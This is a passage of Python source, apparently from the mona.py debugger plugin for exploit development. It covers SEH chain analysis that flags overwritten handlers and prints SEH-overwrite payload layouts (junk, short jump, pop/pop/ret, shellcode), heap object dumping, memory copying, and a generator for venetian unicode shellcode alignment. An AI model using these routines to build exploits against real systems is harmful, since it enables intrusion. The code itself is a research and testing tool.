					dbg.setBreakpoint(sehandler)
					bpsuccess = True
			except:
				bpsuccess = False
			bptext = ""
			if not bpsuccess:
				bptext = "BP failed"
			else:
				bptext = "BP set"
			ptr = MnPointer(sehandler)
			funcinfo = ptr.getPtrFunction()
			#dbg.log("0x%08x  %s  0x%08x %s <- %s" % (address,nseh,sehandler,funcinfo,bptext))
			dict_sehrecords[address] = [nsehvalue, sehandler, funcinfo, bptext]
			sehseq.append(address)
		print_dict_table(dict_sehrecords, headers, types, padding = "      ", itemsequence=sehseq)

	dbg.log("")
	return "Done"

def _walkSehChain(sehchain):
	"""Walk a list of SEH records and analyse each entry.

	Arguments:
		sehchain - list of [record_address, handler_address] pairs
		           (same format as dbg.getSehChain() or MnTEB.SEHChain)

	Returns: (records, overwritten)
		records     - OrderedDict {record_addr: [nseh_value, handler, funcname, info]}
		overwritten - dict {record_addr: [type, offset]}  (only smashed entries)
	"""
	records = OrderedDict()
	overwritten = {}
	for sehrecord in sehchain:
		recaddress = sehrecord[0]
		sehandler = sehrecord[1]
		nsehvalue = 0
		nseh = ""
		try:
			nsehvalue = struct.unpack('<L', dbg.readMemory(recaddress, 4))[0]
			nseh = "0x%08x" % nsehvalue
		except:
			nseh = 0
			sehandler = 0
		overwritedata = checkSEHOverwrite(recaddress, nseh, sehandler)
		funcname = ""
		recinfo = ""
		if sehandler > 0:
			ptr = MnPointer(sehandler)
			funcname = ptr.getPtrFunction()
		else:
			recinfo = "corrupted record"
			if str(nseh).startswith("0x"):
				nseh = "0x%08x" % int(nseh, 16)
			else:
				nseh = "0x%08x" % int(nseh)
		if len(overwritedata) > 0:
			overwritten[recaddress] = overwritedata
			smashoffset = int(overwritedata[1])
			typeinfo = ""
			if overwritedata[0] == "unicode":
				smashoffset += 2
				typeinfo = " [unicode]"
			recinfo = "Smashed, offset %d%s" % (smashoffset, typeinfo)
		if nsehvalue == 0xffffffff:
			recinfo = "End of SEH chain"
		records[recaddress] = [nsehvalue, sehandler, funcname, recinfo]
	return records, overwritten

def procSehChain(self):
	sehchain = dbg.getSehChain()
	dbg.log("Nr of SEH records : %d" % len(sehchain))
	dbg.log("")

	if len(sehchain) > 0:
		dbg.log("Start of chain (TEB FS:[0]) : 0x%08x" % sehchain[0][0])
		dbg.log("")

		records, handlersoverwritten = _walkSehChain(sehchain)

		headers = ["On Stack", "Next SEH", "SE Handler", "Function", "Info"]
		types   = ["pointer", "pointer", "pointer", "string", "string"]
		print_dict_table(records, headers, types, padding = "      ")

		if len(handlersoverwritten) > 0:
			dbg.log("")
			dbg.log("Payload structure suggestion(s):")
			for overwrittenhandler in handlersoverwritten:
				overwrittendata = handlersoverwritten[overwrittenhandler]
				overwrittentype = overwrittendata[0]
				overwrittenoffset = int(overwrittendata[1])
				if not overwrittentype == "unicode":
					dbg.log("[Junk * %d]['\\xeb\\x06\\x41\\x41'][p/p/r][shellcode][more junk if needed]" % (overwrittenoffset))
				else:
					overwrittenoffset += 2
					dbg.log("[Junk * %d][nseh - walkover][unicode p/p/r][venetian alignment][shellcode][more junk if needed]" % overwrittenoffset)
	return

def procDumpLog(args):
	logfile = ""
	levels = 0
	nestedsize = 0x28
	filtersize = 0
	ignorefree = False
	
	if "f" in args:
		if type(args["f"]).__name__.lower() != "bool":
			logfile = getAbsolutePath(args["f"])
	
	if "nofree" in args:
		ignorefree = True			
			

	if "l" in args:
		if type(args["l"]).__name__.lower() != "bool":
			if str(args["l"]).lower().startswith("0x"):
				try:
					levels = int(args["l"],16)
				except:
					levels = 0
			else:
				try:
					levels = int(args["l"])
				except:
					levels = 0

	if "m" in args:
		if type(args["m"]).__name__.lower() != "bool":
			if str(args["m"]).lower().startswith("0x"):
				try:
					nestedsize = int(args["m"],16)
				except:
					nestedsize = 0x28
			else:
				try:
					nestedsize = int(args["m"])
				except:
					nestedsize = 0x28

	if "s" in args:
		if type(args["s"]).__name__.lower() != "bool":
			if str(args["s"]).lower().startswith("0x"):
				try:
					filtersize = int(args["s"],16)
				except:
					filtersize = 0
			else:
				try:
					filtersize = int(args["s"])
				except:
					filtersize = 0

	if logfile == "":
		dbg.log(" *** Error: please specify a valid logfile with argument -f ***",highlight=1)
		return

	allocs = 0
	frees = 0
	# open logfile and record all objects & sizes
	logdata = {}
	try:
		dbg.log("[+] Parsing logfile %s" % logfile)
		f = open(logfile,"rb")
		contents = f.readlines()
		f.close()

		for tline in contents:
			line = ensure_text(tline)
			dbgp("Read line from logfile: %s" % line)
			if line.startswith("alloc("):
				size = ""
				addy = ""
				lineparts = line.split("(")
				if len(lineparts) > 1:
					sizeparts = lineparts[1].split(")")
					size = sizeparts[0].replace(" ","")
				lineparts = line.split("=")
				if len(lineparts) > 1:
					linepartaddy = lineparts[1].split(" ")
					for lpa in linepartaddy:
						if addy != "":
							break
						if lpa != "":
							addy = lpa 
				if size != "" and addy != "":
					size = size.lower()
					addy = addy.lower()
					if not addy in logdata:
						if filtersize == 0:
							logdata[addy] = size
							allocs += 1
						else:
							try:
								isize = int(size,16)
								if isize == filtersize:
									logdata[addy] = size
									allocs += 1
							except:
								continue

			if line.startswith("free(") and not ignorefree:
				addy = ""
				lineparts = line.split("(")
				if len(lineparts) > 1:
					addyparts = lineparts[1].split(")")
					addy = addyparts[0].replace(" ","")
				if addy != "":
					addy = addy.lower()
					if addy in logdata:
						del logdata[addy]
						frees += 1			

		if ignorefree:
			dbg.log("[+] Ignoring all free() events, showing all allocations")
		dbg.log("[+] Logfile parsed, %d objects found" % len(logdata))
		if filtersize > 0:
			dbg.log("    Only showing alloc chunks of size 0x%08x" % filtersize)
		dbg.log("    Total allocs: %d, total free: %d" % (allocs,frees))
		dbg.log("[+] Dumping objects")
		logfile = MnLog("dump_alloc_free.txt")
		thislog = logfile.reset()
		logfile.write("Addresses to dump:", thislog)
		allocsizegroups = {}
		allocsizes = []
		heapgranularity = 8
		for addy in logdata:
			logfile.write("%s (%s)" % (addy, logdata[addy]), thislog)
			allocsize = getHeapAllocSize(logdata[addy], heapgranularity)
			if not allocsize in allocsizegroups:
				allocsizegroups[allocsize] = [addy]
			else:
				allocsizegroups[allocsize].append(addy)
			if not allocsize in allocsizes:
				allocsizes.append(allocsize)
		logfile.write("", thislog);
		logfile.write("(Allocated) Size groups, heap granularity %d bytes" % heapgranularity, thislog)
		allocsizes.sort()
		for allocsize in allocsizes:
			logfile.write("Size 0x%02x" % allocsize, thislog)
			for allocsizeaddy in allocsizegroups[allocsize]:
				logfile.write("  %s (%s)" % (allocsizeaddy, logdata[allocsizeaddy]), thislog)
			
		maxnr = len(logdata)
		curnr = 1
		# show eta every 20 objects
		flipcnt = 1
		flipmax = 20
		startmoment = get_current_datetime()
		for addy in logdata:
			seqtxt = "(%d/%d)" % (curnr, maxnr)
			asize = logdata[addy]
			ptrx = MnPointer(int(addy,16))
			size = int(asize,16)
			#dumpObjectAtLocation(self,size,levels=0,nestedsize=0,customthislog="",customlogfile="", custommsg="")
			dumpdata = ptrx.dumpObjectAtLocation(size,levels=levels,nestedsize=nestedsize,customthislog=thislog,customlogfile=logfile,custommsg=seqtxt)
			if flipcnt > flipmax:
				flipcnt = 1
				thistimestamp = get_current_datetime()
				eta = get_eta(startmoment, curnr, maxnr)
				updatetext = ">> Update: {done} / {total} items processed ({ts}) - ({pct:.2f}%) - ETA: {eta}".format(
					done=curnr,
					total=maxnr,
					ts=thistimestamp,
					pct=(curnr * 100.0) / maxnr,
					eta=eta
				)
				dbg.log(updatetext)
			curnr += 1			
			interruptMona()
	except:
		dbg.log(" *** Unable to open logfile %s ***" % logfile,highlight=1)
		dbg.log(traceback.format_exc())
		return


	return

def procDumpObj(args):
	addy = 0
	levels = 0
	size = 0
	nestedsize = 0x28
	regs = getRegisters()
	if "a" in args:
		if type(args["a"]).__name__.lower() != "bool":
			addy,addyok = getAddyArg(args["a"])

	if "s" in args:
		if type(args["s"]).__name__.lower() != "bool":
			if str(args["s"]).lower().startswith("0x"):
				try:
					size = int(args["s"],16)
				except:
					size = 0
			else:
				try:
					size = int(args["s"])
				except:
					size = 0

	if "l" in args:
		if type(args["l"]).__name__.lower() != "bool":
			if str(args["l"]).lower().startswith("0x"):
				try:
					levels = int(args["l"],16)
				except:
					levels = 0
			else:
				try:
					levels = int(args["l"])
				except:
					levels = 0

	if "m" in args:
		if type(args["m"]).__name__.lower() != "bool":
			if str(args["m"]).lower().startswith("0x"):
				try:
					nestedsize = int(args["m"],16)
				except:
					nestedsize = 0
			else:
				try:
					nestedsize = int(args["m"])
				except:
					nestedsize = 0

	errorsfound = False
	if addy == 0:
		errorsfound = True
		dbg.log("*** Please specify a valid address to argument -a ***",highlight=1)
	else:
		ptrx = MnPointer(addy)
	osize = size
	if size == 0:
		# no size specified
		if addy > 0:
			dbg.log("[+] No size specified, checking if address is part of known heap chunk")
			
			if ptrx.isInHeap():
				heapinfo = ptrx.getHeapInfo()
				heapaddy = heapinfo[0]
				chunkobj = heapinfo[3]
				if not heapaddy == None:
					if heapaddy > 0:
						chunkaddy = chunkobj.chunkptr
						size = chunkobj.usersize
						dbg.log("    Address found in chunk 0x%08x, heap 0x%08x, (user)size 0x%02x" % (chunkaddy, heapaddy, size))
						addy = chunkobj.userptr
						if size > 0xfff:
							dbg.log("    I'll only dump 0xfff bytes from the object, for performance reasons")
							size = 0xfff
	if size > 0xfff and osize > 0:
		errorsfound = True
		dbg.log("*** Please keep the size below 0xfff (argument -s) ***",highlight=1)
	if size == 0:
		size = 0x28
	if levels > 0 and nestedsize == 0:
		errorsfound = True
		dbg.log("*** Please specify a valid size to argument -m ***",highlight=1)				

	if not errorsfound:
		ptrx = MnPointer(addy)
		dumpdata = ptrx.dumpObjectAtLocation(size,levels,nestedsize)

	return

# routine to copy bytes from one location to another
def procCopy(args):
	src = 0
	dst = 0
	nrbytes = 0
	regs = getRegisters()
	if "src" in args:
		if type(args["src"]).__name__.lower() != "bool":
			src,addyok = getAddyArg(args["src"])

	if "dst" in args:
		if type(args["dst"]).__name__.lower() != "bool":
			dst,addyok = getAddyArg(args["dst"])

	if "n" in args:
		if type(args["n"]).__name__.lower() != "bool":
			if "+" in str(args['n']) or "-" in str(args['n']):
				nrbytes,bytesok = getAddyArg(args['n'])
				if not bytesok:
					errorsfound = True
			else:
				if str(args['n']).lower().startswith("0x"):
					try:
						nrbytes = int(args["n"],16)
					except:
						nrbytes = 0
				else:
					try:
						nrbytes = int(args["n"])
					except:
						nrbytes = 0

	errorsfound = False
	if src == 0:
		errorsfound = True
		dbg.log("*** Please specify a valid source address to argument -src ***",highlight=1)
		dbg.log("*** You provided '%s', and that resolves into 0" % args["src"],highlight=1)
	if dst == 0:
		errorsfound = True
		dbg.log("*** Please specify a valid destination address to argument -dst ***",highlight=1)
		dbg.log("*** You provided '%s', and that resolves into 0" % args["dst"],highlight=1)
	if nrbytes == 0:
		errorsfound = True
		dbg.log("*** Please specify a valid number of bytes to argument -n ***",highlight=1)

	if not errorsfound:
		dbg.log("[+] Attempting to copy 0x%x (%d) bytes" % (nrbytes, nrbytes))
		dbg.log("    Source      : %s : %s" % (args["src"], PTR_PRINT % src))
		dbg.log("    Destination : %s : %s" % (args["dst"], PTR_PRINT % dst))
		sourcebytes = dbg.readMemory(src,nrbytes)
		try:
			dbg.writeMemory(dst,sourcebytes)
			dbg.log("    Done.")
		except Exception as e:
			dbg.log("    *** Copy failed, check if both locations are accessible/mapped",highlight=1)
			dbg.log("    *** %s" % str(e))
			dbgp("    *** Traceback: %s" % traceback.format_exc(), errormode=False)
	return

# unicode alignment routines written by floyd (http://www.floyd.ch, twitter: @floyd_ch)
def procUnicodeAlign(args):
	leaks = False
	address = 0
	alignresults = {}
	bufferRegister = "eax" #we will put ebp into the buffer register
	timeToRun = 15
	registers = {"eax":0, "ebx":0, "ecx":0, "edx":0, "esp":0, "ebp":0,}
	showerror = False
	regs = getRegisters()

	if "l" in args:
		leaks = True

	if "a" in args:
		if type(args["a"]).__name__.lower() != "bool":
			address,addyok = getAddyArg(args["a"])
	else:
		address = regs["eip"]
		if leaks:
			address += 1

	if address == 0:
		dbg.log("Please enter a valid address with argument -a",highlight=1)
		dbg.log("This address must be the location where the alignment code will be placed/start")
		dbg.log("(without leaking zero byte). Don't worry, the script will only use")
		dbg.log("it to calculate the offset from the address to EBP.")
		showerror=True

	if "b" in args:
		if args["b"].lower().strip() == "eax":
			bufferRegister = 'eax'
		elif args["b"].lower().strip() == "ebx":
			bufferRegister = 'ebx'
		elif args["b"].lower().strip() == "ecx":
			bufferRegister = 'ecx'
		elif args["b"].lower().strip() == "edx":
			bufferRegister = 'edx'
		else:
			dbg.log("Please enter a valid register with argument -b")
			dbg.log("Valid registers are: eax, ebx, ecx, edx")
			showerror = True

	if "t" in args and args["t"] != "":
		try:
			timeToRun = int(args["t"])
			if timeToRun < 0:
				timeToRun = timeToRun * (-1)
		except:
			dbg.log("Please enter a valid integer for -t",highlight=1)
			showerror=True
	if "ebp" in args and args["ebp"] != "":
		try:
			registers["ebp"] = int(args["ebp"],16)
		except:
			dbg.log("Please enter a valid value for ebp",highlight=1)
			showerror=True

	dbg.log("[+] Start address for venetian alignment routine: 0x%08x" % address)
	dbg.log("[+] Will prepend alignment with null byte compensation? %s" % str(leaks).lower())
	# ebp must be writeable for this routine to work
	value_of_ebp = regs["ebp"]
	dbg.log("[+] Checking if ebp (0x%08x) is writeable" % value_of_ebp)
	ebpaccess = getPointerAccess(value_of_ebp)
	if not "WRITE" in ebpaccess:
		dbg.log("[!] Warning! ebp does not appear to be writeable!",highlight = 1)
		dbg.log("    You will have to run some custom instructions first to make ebp writeable")
		dbg.log("    and at that point, run this mona command again.")
		dbg.log("    Hints: maybe you can pop something off the stack into ebp,")
		dbg.log("    or push esp and pop it into ebp.")
		showerror = True
	else:
		dbg.log("    OK (%s)" % ebpaccess)
	if not showerror:

		alignresults = prepareAlignment(leaks, address, bufferRegister, timeToRun, registers)
		# write results to file
		if len(alignresults) > 0:
			if not silent:
				dbg.log("[+] Alignment generator finished, %d results" % len(alignresults))
				logfile = MnLog("venetian_alignment.txt")
				thislog = logfile.reset(skipModuleTable=True)
				for resultnr in alignresults:
					resulttitle = "Alignment routine %d:" % resultnr
					logfile.write(resulttitle,thislog)
					logfile.write("-" * len(resulttitle),thislog)
					theseresults = alignresults[resultnr]
					for resultinstructions in theseresults:
						logfile.write("Instructions:",thislog)
						resultlines = resultinstructions.split(";")
						for resultline in resultlines:
							logfile.write("   %s" % resultline.strip(),thislog)
						logfile.write("Hex:",thislog)
						logfile.write("'%s'" % theseresults[resultinstructions],thislog)
					logfile.write("",thislog)
	return alignresults

def prepareAlignment(leaks, address, bufferRegister, timeToRun, registers):

	def getRegister(registerName):
		registerName = registerName.lower()
		regs = getRegisters()
		if registerName in regs:
			return regs[registerName]

	def calculateNewXregister(x,h,l):
		return ((x>>16)<<16)+(h<<8)+l

	prefix = ""
	postfix = ""
	additionalLength = 0 #Length of the prefix+postfix instructions in after-unicode-conversion bytes
	code_to_get_rid_of_zeros = "add [ebp],ch; " #\x6d --> \x00\x6d\x00

	buf_sig = bufferRegister[1]
	
	registers_to_fill = ["ah", "al", "bh", "bl", "ch", "cl", "dh", "dl"] #important: h's first!
	registers_to_fill.remove(buf_sig+"h")
	registers_to_fill.remove(buf_sig+"l")
	
	leadingZero = leaks

	for name in registers:
		if not registers[name]:
			registers[name] = getRegister(name)

	#256 values with only 8276 instructions (bruteforced), best found so far:
	#values_to_generate_all_255_values = [71, 87, 15, 251, 162, 185]
	#but to be on the safe side, let's take only A-Za-z values (in 8669 instructions):
	values_to_generate_all_255_values = [86, 85, 75, 109, 121, 99]
	
	new_values = zip(registers_to_fill, values_to_generate_all_255_values)
	
	if leadingZero:
		prefix += code_to_get_rid_of_zeros
		additionalLength += 2
		leadingZero = False
	#prefix += "mov bl,0; mov bh,0; mov cl,0; mov ch,0; mov dl,0; mov dh,0; "
	#additionalLength += 12
	for name, value in zip(registers_to_fill, values_to_generate_all_255_values):
		padding = ""
		if value < 16:
			padding = "0"
		if "h" in name:
			prefix += "mov e%sx,0x4100%s%s00; " % (name[0], padding, hex(value)[2:])
			prefix += "add [ebp],ch; "
			additionalLength += 8
		if "l" in name:
			prefix += "mov e%sx,0x4100%s%s00; " % (buf_sig, padding, hex(value)[2:])
			prefix += "add %s,%sh; " % (name, buf_sig)
			prefix += "add [ebp],ch; "
			additionalLength += 10
	leadingZero = False
	new_values_dict = dict(new_values)
	for new in registers_to_fill[::2]:
		n = new[0]
		registers['e%sx'%n] = calculateNewXregister(registers['e%sx'%n], new_values_dict['%sh'%n], new_values_dict['%sl'%n])
	
	if leadingZero:
		prefix += code_to_get_rid_of_zeros
		additionalLength += 2
		leadingZero = False
	#Let's push the value of ebp into the BufferRegister
	prefix += "push ebp; %spop %s; " % (code_to_get_rid_of_zeros, bufferRegister)
	leadingZero = True
	additionalLength += 6
	registers[bufferRegister] = registers["ebp"]

	if not leadingZero:
		#We need a leading zero for the ADD operations
		prefix += "push ebp; " #something 1 byte, doesn't matter what
		leadingZero = True
		additionalLength += 2
				
	#The last ADD command will leak another zero to the next instruction
	#Therefore append (postfix) a last instruction to get rid of it
	#so the shellcode is nicely aligned				
	postfix += code_to_get_rid_of_zeros
	additionalLength += 2
	
	alignresults = generateAlignment(address, bufferRegister, registers, timeToRun, prefix, postfix, additionalLength)

	return alignresults

def generateAlignment(alignment_code_loc, bufferRegister, registers, timeToRun, prefix, postfix, additionalLength):

	import copy, random, time

	alignresults = {}

	def sanitiseZeros(originals, names):
		for index, i in enumerate(originals):
			if i == 0:
				warn("Your %s register is zero. That's bad for the heuristic." % names[index])
				warn("In general this means there will be no result or they consist of more bytes.")

	def checkDuplicates(originals, names):
		duplicates = len(originals) - len(set(originals))
		if duplicates > 0:
			warn("""Some of the 2 byte registers seem to be the same. There is/are %i duplicate(s):""" % duplicates)
			warn("In general this means there will be no result or they consist of more bytes.")
			warn(", ".join(names))
			warn(", ".join(hexlist(originals)))

	def checkHigherByteBufferRegisterForOverflow(g1, name, g2):
		overflowDanger = 0x100-g1
		max_instructions = overflowDanger*256-g2
		if overflowDanger <= 3:
			warn("Your BufferRegister's %s register value starts pretty high (%s) and might overflow." % (name, hex(g1)))
			warn("Therefore we only look for solutions with less than %i bytes (%s%s until overflow)." % (max_instructions, hex(g1), hex(g2)[2:]))
			warn("This makes our search space smaller, meaning it's harder to find a solution.")
		return max_instructions

	def randomise(values, maxValues):
		for index, i in enumerate(values):
			if random.random() <= MAGIC_PROBABILITY_OF_ADDING_AN_ELEMENT_FROM_INPUTS:
				values[index] += 1 
				values[index] = values[index] % maxValues[index]

	def check(as1, index_for_higher_byte, ss, gs, xs, ys, M, best_result):
		g1, g2 = gs
		s1, s2 = ss
		sum_of_instructions = 2*sum(xs) + 2*sum(ys) + M
		if best_result > sum_of_instructions:
			res0 = s1
			res1 = s2
			for index, _ in enumerate(as1):
				res0 += as1[index]*xs[index] % 256
			res0 = res0 - ((g2+sum_of_instructions)//256)
			as2 = copy.copy(as1)
			as2[index_for_higher_byte] = (g1 + ((g2+sum_of_instructions)//256)) % 256
			for index, _ in enumerate(as2):
				res1 += as2[index]*ys[index] % 256
			res1 = res1 - sum_of_instructions
			if g1 == res0 % 256 and g2 == res1 % 256:
				return sum_of_instructions
		return 0
	
	def printNicely(names, buffer_registers_4_byte_names, xs, ys, additionalLength=0, prefix="", postfix=""):
		
		thisresult = {}

		resulting_string = prefix
		sum_bytes = 0
		for index, x in enumerate(xs):
			for k in range(0, x):
				resulting_string += "add "+buffer_registers_4_byte_names[0]+","+names[index]+"; "
				sum_bytes += 2
		for index, y in enumerate(ys):
			for k in range(y):
				resulting_string += "add "+buffer_registers_4_byte_names[1]+","+names[index]+"; "
				sum_bytes += 2
		resulting_string += postfix
		sum_bytes += additionalLength
		
		if not silent:
			info("[+] %i resulting bytes (%i bytes injection) of Unicode code alignment. Instructions:"%(sum_bytes,sum_bytes//2))
			info("   ", resulting_string)
		hex_bytes = metasm(resulting_string)  # bytes expected
		# Normalize to bytes in case caller ever returns str/iterable
		if isinstance(hex_bytes, str):
			hex_bytes = hex_bytes.encode('latin-1', 'backslashreplace')
		elif not isinstance(hex_bytes, (bytes, bytearray)):
			hex_bytes = bytes(hex_bytes)
		to_iter = bytearray(hex_bytes)  # py2/py3: iteration yields ints
		if not silent:
			display = ''.join('\\x{:02x}'.format(b) for b in to_iter)
			info("    Unicode safe opcodes without zero bytes:")
			info("   ", display)
		thisresult[resulting_string] = hex_bytes      # keep bytes for later use


		#if not silent:
		#	info("    Unicode safe opcodes without zero bytes:")
		#	info("   ", hex_string)
		#thisresult[resulting_string] = hex_string
		
		return thisresult


	def metasm(inputInstr):
		#the immunity and metasm assembly differ a lot:
		#immunity add [ebp],ch "\x00\xad\x00\x00\x00\x00"
		#metasm add [ebp],ch "\x00\x6d\x00" --> we want this!
		#Therefore implementing our own "metasm" mapping here
		#same problem for things like mov eax,0x41004300			     
		ass_operation = {'add [ebp],ch': '\\x00\x6d\\x00', 'pop ebp': ']', 'pop edx': 'Z', 'pop ecx': 'Y', 'push ecx': 'Q',
					'pop ebx': '[', 'push ebx': 'S', 'pop eax': 'X', 'push eax': 'P', 'push esp': 'T', 'push ebp': 'U',
					'push edx': 'R', 'pop esp': '\\', 'add dl,bh': '\\x00\\xfa', 'add dl,dh': '\\x00\\xf2',
					'add dl,ah': '\\x00\\xe2', 'add ah,al': '\\x00\\xc4', 'add ah,ah': '\\x00\\xe4', 'add ch,bl': '\\x00\\xdd',
					'add ah,cl': '\\x00\\xcc', 'add bl,ah': '\\x00\\xe3', 'add bh,dh': '\\x00\\xf7', 'add bl,cl': '\\x00\\xcb',
					'add ah,ch': '\\x00\\xec', 'add bl,al': '\\x00\\xc3', 'add bh,dl': '\\x00\\xd7', 'add bl,ch': '\\x00\\xeb',
					'add dl,cl': '\\x00\\xca', 'add dl,bl': '\\x00\\xda', 'add al,ah': '\\x00\\xe0', 'add bh,ch': '\\x00\\xef',
					'add al,al': '\\x00\\xc0', 'add bh,cl': '\\x00\\xcf', 'add al,ch': '\\x00\\xe8', 'add dh,bl': '\\x00\\xde',
					'add ch,ch': '\\x00\\xed', 'add cl,dl': '\\x00\\xd1', 'add al,cl': '\\x00\\xc8', 'add dh,bh': '\\x00\\xfe',
					'add ch,cl': '\\x00\\xcd', 'add cl,dh': '\\x00\\xf1', 'add ch,ah': '\\x00\\xe5', 'add cl,bl': '\\x00\\xd9',
					'add dh,al': '\\x00\\xc6', 'add ch,al': '\\x00\\xc5', 'add cl,bh': '\\x00\\xf9', 'add dh,ah': '\\x00\\xe6',
					'add dl,dl': '\\x00\\xd2', 'add dh,cl': '\\x00\\xce', 'add dh,dl': '\\x00\\xd6', 'add ah,dh': '\\x00\\xf4',
					'add dh,dh': '\\x00\\xf6', 'add ah,dl': '\\x00\\xd4', 'add ah,bh': '\\x00\\xfc', 'add ah,bl': '\\x00\\xdc',
					'add bl,bh': '\\x00\\xfb', 'add bh,al': '\\x00\\xc7', 'add bl,dl': '\\x00\\xd3', 'add bl,bl': '\\x00\\xdb',
					'add bh,ah': '\\x00\\xe7', 'add bl,dh': '\\x00\\xf3', 'add bh,bl': '\\x00\\xdf', 'add al,bl': '\\x00\\xd8',
					'add bh,bh': '\\x00\\xff', 'add al,bh': '\\x00\\xf8', 'add al,dl': '\\x00\\xd0', 'add dl,ch': '\\x00\\xea',
					'add dl,al': '\\x00\\xc2', 'add al,dh': '\\x00\\xf0', 'add cl,cl': '\\x00\\xc9', 'add cl,ch': '\\x00\\xe9',
					'add ch,bh': '\\x00\\xfd', 'add cl,al': '\\x00\\xc1', 'add ch,dh': '\\x00\\xf5', 'add cl,ah': '\\x00\\xe1',
					'add dh,ch': '\\x00\\xee', 'add ch,dl': '\\x00\\xd5', 'add ch,ah': '\\x00\\xe5', 'mov dh,0': '\\xb6\\x00',
					'add dl,ah': '\\x00\\xe2', 'mov dl,0': '\\xb2\\x00', 'mov ch,0': '\\xb5\\x00', 'mov cl,0': '\\xb1\\x00',
					'mov bh,0': '\\xb7\\x00', 'add bl,ah': '\\x00\\xe3', 'mov bl,0': '\\xb3\\x00', 'add dh,ah': '\\x00\\xe6',
					'add cl,ah': '\\x00\\xe1', 'add bh,ah': '\\x00\\xe7'}
		for example_instr, example_op in [("mov eax,0x41004300", "\\xb8\\x00\\x43\\x00\\x41"),
							("mov ebx,0x4100af00", "\\xbb\\x00\\xaf\\x00\\x41"),
							("mov ecx,0x41004300", "\\xb9\\x00\\x43\\x00\\x41"),
							("mov edx,0x41004300", "\\xba\\x00\\x43\\x00\\x41")]:
			for i in range(0,256):
				padding =""
				if i < 16:
					padding = "0"
				new_instr = example_instr[:14]+padding+hex(i)[2:]+example_instr[16:]
				new_op = example_op[:10]+padding+hex(i)[2:]+example_op[12:]
				ass_operation[new_instr] = new_op
		res = ""
		for instr in inputInstr.split("; "):
			if instr in ass_operation:
				res += ass_operation[instr].replace("\\x00","")
			elif instr.strip():
				warn("    Couldn't find metasm assembly for %s" % str(instr))
				warn("    You have to manually convert it in the metasm shell")
				res += "<"+instr+">"
		return res.encode('latin-1')
		
	def getCyclic(originals):
		cyclic = [0 for i in range(0,len(originals))]
		for index, orig_num in enumerate(originals):
			cycle = 1
			num = orig_num
			while True:
				cycle += 1
				num += orig_num
				num = num % 256
				if num == orig_num:
					cyclic[index] = cycle
					break
		return cyclic

	def hexlist(lis):
		return [hex(i) for i in lis]
		
	def theX(num):
		res = (num>>16)<<16 ^ num
		return res
		
	def higher(num):
		res = num>>8
		return res
		
	def lower(num):
		res = ((num>>8)<<8) ^ num
		return res
		
	def info(*text):
		dbg.log(" ".join(str(i) for i in text))
		
	def warn(*text):
		dbg.log(" ".join(str(i) for i in text), highlight=1)
		
	def debug(*text):
		if False:
			dbg.log(" ".join(str(i) for i in text))


	buffer_registers_4_byte_names = [bufferRegister[1]+"h", bufferRegister[1]+"l"]
	buffer_registers_4_byte_value = theX(registers[bufferRegister])
	
	MAGIC_PROBABILITY_OF_ADDING_AN_ELEMENT_FROM_INPUTS=0.25
	MAGIC_PROBABILITY_OF_RESETTING=0.04
	MAGIC_MAX_PROBABILITY_OF_RESETTING=0.11

	originals = []
	ax = theX(registers["eax"])
	ah = higher(ax)
	al = lower(ax)
		
	bx = theX(registers["ebx"])
	bh = higher(bx)
	bl = lower(bx)
	
	cx = theX(registers["ecx"])
	ch = higher(cx)
	cl = lower(cx)
	
	dx = theX(registers["edx"])
	dh = higher(dx)
	dl = lower(dx)
	
	start_address = theX(buffer_registers_4_byte_value)
	s1 = higher(start_address)
	s2 = lower(start_address)
	
	alignment_code_loc_address = theX(alignment_code_loc)
	g1 = higher(alignment_code_loc_address)
	g2 = lower(alignment_code_loc_address)
	
	names = ['ah', 'al', 'bh', 'bl', 'ch', 'cl', 'dh', 'dl']
	originals = [ah, al, bh, bl, ch, cl, dh, dl]
	sanitiseZeros(originals, names)
	checkDuplicates(originals, names)
	best_result = checkHigherByteBufferRegisterForOverflow(g1, buffer_registers_4_byte_names[0], g2)
				
	xs = [0 for i in range(0,len(originals))]
	ys = [0 for i in range(0,len(originals))]
	
	cyclic = getCyclic(originals)
	mul = 1
	for i in cyclic:
		mul *= i

	if not silent:
		dbg.log("[+] Searching for random solutions for code alignment code in at least %i possibilities..." % mul)
		dbg.log("    Bufferregister: %s" % bufferRegister)
		dbg.log("    Max time: %d seconds" % timeToRun)
		dbg.log("")

	#We can't even know the value of AH yet (no, it's NOT g1 for high instruction counts)
	cyclic2 = copy.copy(cyclic)
	cyclic2[names.index(buffer_registers_4_byte_names[0])] = 9999999
	
	number_of_tries = 0.0
	beginning = time.time()
	resultFound = False
	resultcnt = 0
	while time.time()-beginning < timeToRun: #Run only timeToRun seconds!
		randomise(xs, cyclic)
		randomise(ys, cyclic2)
		
		#[Extra constraint!]
		#not allowed: all operations with the bufferRegister,
		#because we can not rely on it's values, e.g.
		#add al, al
		#add al, ah
		#add ah, ah
		#add ah, al
		xs[names.index(buffer_registers_4_byte_names[0])] = 0
		xs[names.index(buffer_registers_4_byte_names[1])] = 0
		ys[names.index(buffer_registers_4_byte_names[0])] = 0
		ys[names.index(buffer_registers_4_byte_names[1])] = 0
		
		tmp = check(originals, names.index(buffer_registers_4_byte_names[0]), [s1, s2], [g1, g2], xs, ys, additionalLength, best_result)

		if tmp > 0:
			best_result = tmp
			#we got a new result
			resultFound = True
			alignresults[resultcnt] = printNicely(names, buffer_registers_4_byte_names, xs, ys, additionalLength, prefix, postfix)
			resultcnt += 1
			if not silent:
				dbg.log("    Time elapsed so far: %s seconds" % (time.time()-beginning))
				dbg.log("")
		#Slightly increases probability of resetting with time
		probability = MAGIC_PROBABILITY_OF_RESETTING+number_of_tries/(10**8)
		if probability < MAGIC_MAX_PROBABILITY_OF_RESETTING:
			number_of_tries += 1.0
		if random.random() <= probability:
			xs = [0 for i in range(0,len(originals))]
			ys = [0 for i in range(0,len(originals))]
	if not silent:
		dbg.log("")
		dbg.log("    Done. Total time elapsed: %s seconds" % (time.time()-beginning))
	

		if not resultFound:
			dbg.log("")
			dbg.log("No results. Please try again (you might want to increase -t)")
		dbg.log("")
		dbg.log("If you are unsatisfied with the result, run the command again and use the -t option")
		dbg.log("")
	return alignresults
# end unicode alignment routines

def procHeapCookie(args):
	# first find all writeable pages
	allpages = dbg.getMemoryPages()
	filename="heapcookie.txt"
	orderedpages = []
	cookiemonsters = []
	for tpage in allpages.keys():
		orderedpages.append(tpage)
	orderedpages.sort()
	for thispage in orderedpages:
		page = allpages[thispage]
		page_base = page.getBaseAddress()
		page_size = page.getSize()
		page_end = page_base + page_size
		acl = page.getAccess(human=True)
		if "WRITE" in acl:
